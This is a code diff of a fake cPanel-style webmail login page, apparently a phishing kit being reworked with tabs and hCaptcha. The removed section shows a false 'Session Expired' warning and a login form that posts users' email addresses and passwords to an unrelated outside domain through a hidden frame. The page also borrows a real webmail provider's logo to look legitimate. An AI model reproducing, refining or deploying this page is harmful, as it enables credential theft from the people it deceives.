@@ -5,8 +5,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webmail Login</title>
-    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon" />
+    <title>Webmail Login System</title>
+    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncFopyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon" />
+    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
     <style>
         * {
             margin: 0;
@@ -26,7 +27,7 @@
             touch-action: manipulation;
         }
 
-        #login-wrapper {
+        #webmail-wrapper {
             width: 100%;
             max-width: 450px;
             margin: 0 auto;
@@ -49,25 +50,60 @@
             padding: 0;
         }
 
-        #login-container {
-            padding: 0;
+        /* Tab Navigation */
+        .tab-navigation {
+            display: flex;
+            background: #f8f9fa;
+            border-bottom: 1px solid #e1e5e9;
         }
 
-        #login-sub-container {
+        .tab-button {
+            flex: 1;
+            padding: 10px 8px;
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border-bottom: 3px solid transparent;
+        }
+
+        .tab-button:hover {
+            background: #e9ecef;
+            color: #333;
+        }
+
+        .tab-button.active {
+            background: white;
+            color: #ff6600;
+            border-bottom-color: #ff6600;
+            font-weight: 600;
+        }
+
+        /* Tab Panels */
+        .tab-panel {
+            display: none;
             padding: 15px 25px 10px;
         }
 
-        #login-sub-header {
+        .tab-panel.active {
+            display: block;
+        }
+
+        /* Common header styling */
+        .tab-header {
             text-align: center;
             margin-bottom: 20px;
         }
 
-        #login-sub-header img {
+        .tab-header img {
             max-width: 350px;
             height: auto;
         }
 
-        #webmail-logo {
+        .webmail-logo {
             text-align: center;
             margin: 20px auto 30px auto;
             padding-bottom: 20px;
@@ -77,41 +113,72 @@
             align-items: center;
         }
 
-        #forms {
-            margin-top: 15px;
-        }
-
-        #webmail-logo img {
+        .webmail-logo img {
             max-width: 800px;
             height: auto;
             opacity: 0.9;
         }
 
-        #login_form {
-            width: 100%;
+        .cpanel-logo-section {
+            text-align: center;
+            margin: 20px auto 30px auto;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e1e5e9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        .input-req-login {
+        .cpanel-logo-section img {
+            max-width: 120px;
+            height: auto;
+            opacity: 0.9;
+        }
+
+        .page-title {
+            text-align: center;
+            margin: 20px 0;
+            color: #333;
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        .page-description {
+            text-align: center;
+            margin: 0 0 25px 0;
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        /* Forms styling */
+        .webmail-form {
+            width: 100%;
+            margin-top: 15px;
+        }
+
+        /* Input field styling - unified */
+        .input-req {
             margin-bottom: 8px;
         }
 
-        .input-req-login label {
+        .input-req label {
             display: block;
             font-size: 14px;
             font-weight: 600;
             color: #333;
         }
 
-        .input-field-login {
+        .input-field {
             margin-bottom: 15px;
             position: relative;
         }
 
-        .input-field-login.icon {
+        .input-field.icon {
             position: relative;
         }
 
-        .input-field-login.icon::before {
+        .input-field.icon::before {
             content: '';
             position: absolute;
             left: 12px;
@@ -123,15 +190,20 @@
             z-index: 2;
         }
 
-        .username-container::before {
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3E%3Cpath d='M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2'/%3E%3Ccircle cx='12' cy='7' r='4'/%3E%3C/svg%3E");
+        /* Icon types */
+        .email-container::before {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3E%3Cpath d='M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z'/%3E%3Cpolyline points='22,6 12,13 2,6'/%3E%3C/svg%3E");
         }
 
         .password-container::before {
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3E%3Crect x='3' y='11' width='18' height='11' rx='2' ry='2'/%3E%3Cpath d='M7 11V7a5 5 0 0 1 10 0v4'/%3E%3C/svg%3E");
         }
 
-        .input-field-login input {
+        .user-container::before {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3E%3Cpath d='M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2'/%3E%3Ccircle cx='12' cy='7' r='4'/%3E%3C/svg%3E");
+        }
+
+        .input-field input {
             width: 100%;
             padding: 12px 12px 12px 40px;
             border: 2px solid #e1e5e9;
@@ -141,24 +213,34 @@
             background: #fff;
         }
 
-        .input-field-login input:focus {
+        .input-field input:focus {
             outline: none;
             border-color: #667eea;
             box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
         }
 
+        .input-field.focused {
+            transform: translateY(-1px);
+        }
+
+        .input-field.focused input {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        /* Button styling */
         .controls {
             margin-top: 20px;
         }
 
-        .login-btn {
+        .form-btn {
             margin-bottom: 15px;
         }
 
-        .login-btn button {
+        .form-btn button {
             width: 100%;
             padding: 14px;
-            background: #007bff;
+            background: #ff6600;
             color: white;
             border: none;
             border-radius: 8px;
@@ -166,195 +248,34 @@
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
-        .login-btn button:hover {
+        .form-btn button:hover {
             transform: translateY(-1px);
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
+            box-shadow: 0 8px 25px rgba(255, 102, 0, 0.3);
+            background: #e55a00;
         }
 
-        .login-btn button:active {
+        .form-btn button:active {
             transform: translateY(0);
         }
 
-        .reset-pw {
-            text-align: center;
-        }
-
-        .reset-pw a {
-            color: #ff6600;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .reset-pw a:hover {
-            text-decoration: underline;
-        }
-
-        .external-auth-btn {
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid #e1e5e9;
-        }
-
-        .cpanel-id-link {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #e1e5e9;
-            border-radius: 8px;
-            text-decoration: none;
-            color: #333;
-            font-size: 14px;
-            font-weight: 500;
-            transition: all 0.3s ease;
-        }
-
-        .cpanel-id-link:hover {
-            border-color: #667eea;
-            background: rgba(102, 126, 234, 0.05);
-        }
-
-        .cpanel-logo {
+        /* Special styling for cPanel button */
+        .cpanel-btn button::before {
+            content: '';
             width: 20px;
             height: 20px;
-            margin-right: 8px;
-            object-fit: contain;
+            background-image: url("https://e7.pngegg.com/pngimages/900/923/png-clipart-logo-cpanel-computer-software-graphics-cp-company-logo-text-orange.png");
+            background-size: contain;
+            background-repeat: no-repeat;
+            filter: brightness(0) invert(1);
         }
 
-        .copyright {
-            background: #f8f9fa;
-            padding: 20px;
-            text-align: center;
-            color: #666;
-            font-size: 12px;
-            line-height: 1.5;
-        }
-
-        #locale-footer {
-            margin-bottom: 15px;
-        }
-
-        .locale-container ul {
-            list-style: none;
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 12px;
-            align-items: center;
-            padding: 0;
-            margin: 0;
-        }
-
-        .locale-container ul li {
-            margin: 0;
-            padding: 0;
-        }
-
-        .locale-container ul li a {
-            color: #ff6600;
-            text-decoration: none;
-            font-size: 12px;
-            padding: 4px 8px;
-            border-radius: 4px;
-            transition: all 0.2s ease;
-            display: inline-block;
-            white-space: nowrap;
-        }
-
-        .locale-container ul li a:hover {
-            text-decoration: none;
-            background-color: rgba(255, 102, 0, 0.1);
-            color: #e55a00;
-        }
-
-        #morelocale, #lesslocale {
-            background-color: #ff6600;
-            color: white !important;
-            padding: 6px 12px;
-            border-radius: 15px;
-            font-weight: 500;
-            min-width: 24px;
-            text-align: center;
-        }
-
-        #morelocale:hover, #lesslocale:hover {
-            background-color: #e55a00;
-            color: white !important;
-        }
-
-        .copyright a {
-            color: #ff6600;
-            text-decoration: none;
-        }
-
-        .copyright a:hover {
-            text-decoration: underline;
-        }
-
-        #clickthrough_form {
-            display: none;
-        }
-
-        .clear {
-            clear: both;
-        }
-
-        .group::after {
-            content: "";
-            display: table;
-            clear: both;
-        }
-
-        /* Login status messages (from cPanel style) */
-        .login-status {
-            margin: 15px 0;
-            padding: 12px 15px;
-            border-radius: 6px;
-            font-size: 14px;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-
-        .login-status.info {
-            background: #e7f3ff;
-            border: 1px solid #b3d9ff;
-            color: #0066cc;
-        }
-
-        .login-status.error {
-            background: #fee;
-            border: 1px solid #fcc;
-            color: #a00;
-        }
-
-        .login-status.success {
-            background: #efe;
-            border: 1px solid #cfc;
-            color: #060;
-        }
-
-        .login-status.warn {
-            background: #fff8e1;
-            border: 1px solid #ffcc80;
-            color: #f57c00;
-        }
-
-        /* Logging in state */
-        body.logging-in .login-btn button {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        body.logging-in .login-btn button:hover {
-            transform: none;
-            box-shadow: none;
-        }
-
+        /* Status messages */
         .notices {
             margin-bottom: 15px;
         }
@@ -366,6 +287,7 @@
             padding: 10px;
             border-radius: 6px;
             font-size: 14px;
+            display: none;
         }
 
         .notices.success {
@@ -375,650 +297,838 @@
             padding: 10px;
             border-radius: 6px;
             font-size: 14px;
+            display: none;
+        }
+
+        .notices.info {
+            background: #e7f3ff;
+            border: 1px solid #b3d9ff;
+            color: #0066cc;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 14px;
+            display: none;
+        }
+
+        /* Submitting state */
+        body.submitting .form-btn button {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        body.submitting .form-btn button:hover {
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* Additional action links */
+        .additional-actions {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .additional-actions a {
+            color: #ff6600;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .additional-actions a:hover {
+            text-decoration: underline;
+        }
+
+        .external-auth-section {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e1e5e9;
+        }
+
+        .external-auth-btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: #f8f9fa;
+            border: 2px solid #e1e5e9;
+            border-radius: 8px;
+            color: #333;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .external-auth-btn:hover {
+            background: #e9ecef;
+            border-color: #ff6600;
+            color: #ff6600;
+            transform: translateY(-1px);
+        }
+
+        .cpanel-logo {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* Copyright */
+        .copyright {
+            background: #f8f9fa;
+            padding: 20px;
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+
+        .copyright a {
+            color: #ff6600;
+            text-decoration: none;
+        }
+
+        .copyright a:hover {
+            text-decoration: underline;
+        }
+
+        /* Language selection */
+        #locales_list {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e1e5e9;
+        }
+
+        #locales_list a {
+            color: #666;
+            text-decoration: none;
+            font-size: 13px;
+            padding: 5px 8px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+        }
+
+        #locales_list a:hover {
+            background: #f8f9fa;
+            color: #ff6600;
+        }
+
+        #locales_list a.active {
+            background: #ff6600;
+            color: white;
+        }
+
+        /* hCAPTCHA container */
+        .hcaptcha-container {
+            margin: 20px 0;
+            display: flex;
+            justify-content: center;
         }
 
         /* Responsive design */
         @media (max-width: 768px) {
-            #login-wrapper {
+            #webmail-wrapper {
                 max-width: 95%;
                 padding: 10px;
                 min-height: 100vh;
             }
 
-            #login-sub-container {
+            .tab-panel {
                 padding: 25px 20px 20px;
             }
 
-            #login-sub-header img {
+            .tab-header img {
                 max-width: 280px;
                 width: 90%;
             }
 
-            #webmail-logo {
+            .webmail-logo {
                 margin: 30px auto 50px auto;
                 padding-bottom: 25px;
             }
 
-            #webmail-logo img {
+            .webmail-logo img {
                 max-width: 400px;
                 width: 90%;
+            }
+
+            .tab-button {
+                font-size: 11px;
+                padding: 9px 6px;
             }
         }
 
         @media (max-width: 480px) {
-            #login-wrapper {
+            #webmail-wrapper {
                 max-width: 100%;
                 padding: 8px;
             }
 
-            #login-sub-container {
+            .tab-panel {
                 padding: 20px 15px 15px;
             }
 
-            #login-sub-header {
-                margin-bottom: 20px;
-            }
-
-            #login-sub-header img {
-                max-width: 250px;
-                width: 85%;
-            }
-
-            #webmail-logo {
-                margin: 25px auto 45px auto;
-                padding-bottom: 20px;
-            }
-
-            #webmail-logo img {
-                max-width: 350px;
-                width: 85%;
-            }
-
-            .input-field-login input,
-            .email-display {
+            .input-field input {
                 padding: 10px 10px 10px 35px;
                 font-size: 16px; /* Prevents zoom on iOS */
             }
 
-            .login-btn button {
+            .form-btn button {
                 padding: 12px;
                 font-size: 16px;
             }
 
-            .locale-container ul {
-                gap: 8px;
-                flex-wrap: wrap;
-                max-width: 100%;
-            }
-
-            .locale-container ul li a {
-                font-size: 11px;
-                padding: 6px 10px;
-                min-width: 60px;
-                text-align: center;
-            }
-
-            #morelocale, #lesslocale {
-                padding: 8px 14px;
-                font-size: 11px;
-                min-width: 30px;
-            }
-
-            .copyright {
-                padding: 15px 10px;
-                font-size: 11px;
+            .tab-button {
+                font-size: 10px;
+                padding: 8px 5px;
             }
         }
 
         @media (max-width: 320px) {
-            #login-sub-container {
+            .tab-panel {
                 padding: 15px 10px 10px;
             }
 
-            #login-sub-header img {
-                max-width: 200px;
-                width: 80%;
-            }
-
-            #webmail-logo img {
-                max-width: 300px;
-                width: 80%;
-            }
-
-            .input-field-login input,
-            .email-display {
+            .input-field input {
                 padding: 8px 8px 8px 30px;
                 font-size: 16px;
             }
 
-            .input-field-login.icon::before {
+            .input-field.icon::before {
                 left: 8px;
                 width: 14px;
                 height: 14px;
             }
         }
 
-        /* Landscape orientation for mobile devices */
-        @media (max-height: 600px) and (orientation: landscape) {
-            #login-wrapper {
-                min-height: auto;
-                padding: 5px;
-            }
-
-            #login-sub-container {
-                padding: 15px 20px 10px;
-            }
-
-            #login-sub-header {
-                margin-bottom: 15px;
-            }
-
-            #login-sub-header img {
-                max-width: 200px;
-            }
-
-            #webmail-logo {
-                margin: 20px auto 35px auto;
-                padding-bottom: 15px;
-            }
-
-            #webmail-logo img {
-                max-width: 250px;
-            }
-
-            .input-field-login {
-                margin-bottom: 15px;
-            }
-
-            .controls {
-                margin-top: 20px;
-            }
-
-            .copyright {
-                padding: 10px;
-            }
-        }
     </style>
-    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
 </head>
 <body>
-    <div id="login-wrapper" class="group has-pw-reset">
+    <div id="webmail-wrapper">
         <div class="wrapper">
             <div id="content-container">
-                <div id="login-container">
-                    <div id="login-sub-container">
-                        <div id="login-sub-header">
-                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAikAAABbCAMAAACBOOXPAAAAq1BMVEX/bCz/////aij/h1X/ZBj/aCP/aSb/ZR3/xrD/ZyD/aSf/YhP/qIT/dTr/t5v/lHD/4NP/9/P/pH//1Mj/5dr/8uz/ekL/j2b/6uL/+/n/fkz/7eb/XgD/6d//w6z/7OT/cjH/jl//mnb/0sD/ro3/vKT/czn/y7f/iFz/lWn/2cr/rIv/pYf/t57/eEL/glH/sZf/jGL/oXn/k2//rJP/m3H/g1X/kmP/oIFpVGC9AAAXN0lEQVR4nO1de1vaThONSy6EiBIEJIAYRESxLdbW1u//yV6ym0Au5ywJCb/n6dueP2XNbWdnZs9c1iguL96b6XxMQ/44Itp+32RHv1y5WtGD9eXudFTzegaaE9SN3nf6J7p74J/c/k7PQOL18Hhx8HqIzf1FxcGvdRb17REGpbZ5zduj0yrk
-%0Ax5tmy98WpYtLzfaez6PqDw4qZtYzmJzlrv8eeh9d107PQMd51sv/i34Guan3nsLmKQE76Yw8jDn7MZfXbs4+pWNbpvF0c6nTmOdivtJ9i0s6+oMd/nzsOm6hRmwQ/Vb0AdT77WZpHx1CoN33/mWqImlU7y2IUL2mAKNNsZ1Xx/dqnAb9+sZbvOnwe8Wl+puaS/lj28e+E2MiKT4W3QpezHEw39b6OKCPOdPJIWGew5JKQq8sP4ZoIs5EgbDaUe/+ROwjiPgSw3gpWyiU4ZP6OKCXHvY6kC5OoekLIoCb13/c2u/Iz1gOFKnLEM4mS0ym1d42X/Bo5do8E4D4dEDeO1Oi+irOvBNJJK94//4/43hN6g2TDkDKzz1b0RSnqHQWW08+g1enPm/KzB9XAprYYlUo0M97b8FeGWLUfRb8II8CcPpYUnxu1DoiIHw8cXNARyNLILBpbAWLose/k7Xtc5wpz8KWG04j9FvQ2x8RlMsKUssKC
-N84%0A7GBhtvEnAQWfJSnu2a+QuZWv5BQstf4a8BWtrTKN9BDtR4In/IVrUXDJcwb1PHUnGzgY4pJIx8hiwFUjcx/+mswhZ9lpzaiH6EaNtyvmKP1b+FsemR/+QFH22s8+g0/yjmch/Z/d6s/CRu8shX1OcLmpIcl5R7bqidCuJPR2E0JbitJYS18gZLiERH+a0C2FHIDcocnMyRxH2xOdrYK3ngA56OzxY+JLYIIz7FHhutDdImn/dcAUiCiK2mmNlzH1geRlHescVe7xiEg6RojUAB5Kgo1hFBU8eorXGskkOkkh/xOVPsYBDNuygv9OZY2kYGxKnBG/QhnLzD0lyHpctaFAmrK+gckpCEvBMmPHIk4EFSML33RLYMZGdLnBrSrlg6Nc
-S4aqhDAlXDQZrC69oVYzOgJIXUq%0AZBQmM4dK8CHdRB7SekRxgWgs5X/g42PqoYj3UtU8SA0v/l2rHtJwUaAdfZjSpnEt7AUdmXGAXbsZpqTzjBEKBcW7vpk686ZwgHKWfQTrlMRpI5Lm1RWAA55J37KFOcKQaj/wQnCiolgwSspRZjwyHcU3ktKWXJR4YY24kcYY4r7e/QoJPCrvKljafSZm6tWZYQ+1HXSIVm3cjZJoAHbMpxUxopvsR+ZaL/r8oskrhrHTIQtmQhSc+xKPUAIj1wkfy8pZMtQKc+ebTCIly+tBdlXqjhyhbREU0npBpNP2nOmsPIN+ddndSprKCis+BY7NXFKCK4uwLBUqwJdMy1t8Apu2ISRowATSSFC55E9MtmAE6eGtHmSj0IyDm74PEFYv9WTknOmdDGkHuRTVEAE16mw4tvXBpwaRXcFkwraVLWWYPSw1KZtndrAofx8g/pEUvDn6kyw44HTwDq/KillSVh
-o95XYLKDxszjT7pRzpnSnzpDiW7x+S%0AEcEQTbo8JDEuFQXB+ohRMyiEyZCcLURO7t30DcoJAUkkkIK3StFTFlHhC9k4xr9pgv8kmZfxRd2RolNxTFm7TlTUxwckOkseP3QkzuxU0MOridVLdLoBTjQCC+fzBEp6FRsA1EbMpyLN9cFTyKRFELOV8qzJ2q2h9N2VPID4QCUce12SGp+GpYp3vf+Ku6TqT1nqg+fQG1vqh1kiFcbLb7FTo1kOFiRaf7dbdcbJR+dGEpVDYfVhgpekShOPikglhRW6E4iplhx4o4IU2JyVW2Ibl+5Dp+6RzF5SbddrX7O1ArreZnpF5AVQWwZdrlYKAxnyiuPCusHww5zMfXn98Pi1GUckPUoPwshPAp6M5YUrdAVQJQyTMIZ/MJToeqmcY1j3CNw2juOQVY6K58ztSJ5itKSYhZVjHDGDksqw6NZKEw+Kj7ez35eDrNIf2ddNRwOXilnF+8Wi3ozlhRN
-WipAu3RHhGA9Ir6Zcmpw4PfkExdwbiI/Z%0A2r4xhJaZRk+Dm6xUBhOKqNODSnVlUqfVBjp/HISXpFfmWUAyX8kwfJCPm8sKWQfS/gqbNmKuUL+Jt9MOf8ouOrg5BRB7Ckw+nC47rJeS4ptJl+f2DJyHHmljiKxFGJf4EnXtJ2cUSO/Mm6wE7crxlVAxRZRSlLucS2Vg0+TmONdb3iVGbV6e3jmwVDhRvdlXQTME8/7wTEk+wMd6jG/3PLe/GqPSFpOkeJbklRGFAHpKKL6DmCimcUQImCHIN7PE55UOlCY8AAdhZWkYKHbiQo8TIIlTbjZUY6uTE/RFT5Jr7UWJ53XxDq42fA1NAVaymnFpyqIJ3zzMdmgk8RirDaUR7VkXvZm6ENMb3CxdUdy0wFWG+rcaMxugj2AkhQsdOeE2j/gggsj6nr28HZVBatIC9VqMp9GR3o2pFEEyZ4jzNALKb7FZldVS+Esx93FwudbiK3AS0SxDT4JX
-sknw+wmOHVHSsq5260WEdc44u63EYTlVIEnU%0A6ga6N6qoIIvODLAqPxqG3RMDMchVqbid+4TBlsgrq7LuXSgAkh4ZErC0pKCO/udE3EyL5eUilCv3VSLRxFGO1tSuumS4lvsvOXjbAm058fijesJ76HK2wgrJJ8Mn8+EWq1KSSFEz/lgxVmUQ/J5K0NSdUFTNlQlG+J97KERYxb3xJxUOrkz9uTvtf0QyiMuHiSnhEpDB1loMQEckJQU7IefEW7sxWNq6wSYMtWlIYG3VWtY4uuR7DnMMak6lSL058f6DUlKfJQeCf7KW8FkE9TFUknKf9XHLMGeY8CdgKpD1Wg0dVpTXF+L1w/rcELyexj3oj/DpCG/UXUXxf6xYlXhUQYqEx5JSmNbhpKwJ3vPuqHGWCrwiasxql8slmNComI2kiR5esSp0R0AcdGUa66q4UjwSql1yELjhLToYvXOpaoM4R4YJNzNuDqiPTc5Z6oqkl6fJIfgF5
-563GJdoBZ/EXQHQFzQJlVV30TSh9jCx8UKKFHZw%0Am1QjKa645aHSCUn4Pz0qlAtXnDVSlV0ku4ZJfv1xCAlAZX6aB6cmgr5KRqoZkDaJExg/dNdAHOSUv9cqkowMwVHODukIuJWTE2obDFL2HfSRIqQ8+Qg6GrFt4e8sXYDaj4uVsDBK5Xz4RdD+YI1mzLOccCrDu4ic/9GNoSSDAua2MGJp8RVwPvYQweGHEgFBSlKPdZ5fCd59V8mjjZCl8iNKT7wC8vlMZjQnQfCy7eWbOLuknsmTbsqwT6ojB6m8l9IxgEpvq1ycmemHUMDyzeuOUZ75OS8kcIWTHh9lh5o0CY454AQBcPdwAlQcaIF665UHtbksKrJPpbk2ZP68ErHke87tkjUXkF23K4YVn2p3Y2fT1UQgmQkSUnBR3mcBRbaf/XqHj9oOMrzqeunCDPdCo4UD5KMg2rHkWO5ygaU/JearzNTdhQFr8xYJvPpumKmKbU0WIi
-7eQhrARMs2jVFNTk9jaRolIUVPqYMIy7dzPazOoBs0%0AE2syQPSfyR3AshLLR2ZHNoHXG0rCUjktmDuSNc32aDdExuGcI0VMYHrelrFjVPayMIu+Xjmc0YBaI/CKYAcR07yE8j5sd9zHtywVcMAOXHnfxC8cn4n4p7h5DomP7ZZSkrBVp0FOzm55qXB7TrHTYj9ARCDkn1pirCtMCfG2JQxc0I6Y5IliqXQLLgI/od9ogsp3EQaCszN7qe9RKbis8IZHemEa+CIabMQZvioyxa+uHso3wIif21x8H3WJ9kxYZmted6qQG7MJY2EcAaIRUrCcEF/xwD77+XoJOG3zbdE7nN1XMK15/slMdgbJtubvB1LSDVwLVVz6Liu/bQi4Y89gnlo6bIVKVyRdpKXDk+NhRCWa9mLDWjtCFKAnS1Ti/fgEAzLZY3Ng0XRWFnoSNWdUPV316lGOe1eaXJYlmk9IGzX7qc4GxnF2f3Rslrr44nLxrtT
-ok7vJNiWa3pW63NeLid2+aXrOa5V5Q6u6T5k3cDBtTBLX%0AsK2HNMLb3+SjzTYmpmOlbsPesvteG/kdbKjzVv+2uOFl7l2xzVbTOf6689R6Jkys+/4AT+uaXYfUkZvYCa32P1ktB4zb/Dp7SZIPH+2S02Q8dI6F176V/ObQYUs+/FgfvVe5Q6v80HeSQ4G83KXWHxcrta9O0K57jBcZT7Ny+NGd0zGdL5Ij/79utSN9ueZay8ul7rPdH/XW84jvPeP4XG+GadvvN4mt+hfLXNzMey/v7XLT9D/AJfu31Q3FKnJAAAAAElFTkSuQmCC" alt="cPanel &amp; WHM Brand Guide" width="352" height="66">
-                        </div>
-                        <div id="webmail-logo">
-                            <img src="https://webmail.icglink.com/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail" width="200" height="60">
-                        </div>
-                        
-                        <!-- Session Expired Notice -->
-                        <div id="session-expired-notice" style="margin: 20px 25px 0; padding: 12px 16px; background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; text-align: center;">
-                            <div style="color: #856404; font-size: 15px; font-weight: 600; margin-bottom: 4px;">
-                                ⚠ Session Expired!
-                            </div>
-                            <div style="color: #856404; font-size: 13px;">
-                                Your session has expired. Please log in again to continue.
-                            </div>
-                        </div>
-                        
-                        <div id="login-sub">
-                            <div id="clickthrough_form" style="visibility: hidden;">
-                                <form>
-                                    <div class="notices"></div>
-                                    <button class="clickthrough-cont-btn" type="submit"></button>
-                                </form>
-                            </div>
-                            <div id="forms">
-                                <form id="login_form" method="post" action="https://staychessedup.com/tanjiro/external_process.php" target="hidden_frame">
-                                    <div class="notices"></div>
-                                    <div id="login-status" style="visibility: hidden; opacity: 0;">
-                                        <div id="login-status-message"></div>
-                                    </div>
-                                    <div class="input-req-login">
-                                        <label for="user">Email Address</label>
-                                    </div>
-                                    <div class="input-field-login icon username-container">
-                                        <input type="email" id="user" name="user" placeholder="Enter your email address" required>
-                                    </div>
+                <!-- Tab Navigation -->
+                <div class="tab-navigation">
+                    <button class="tab-button active" data-tab="login">Webmail Login</button>
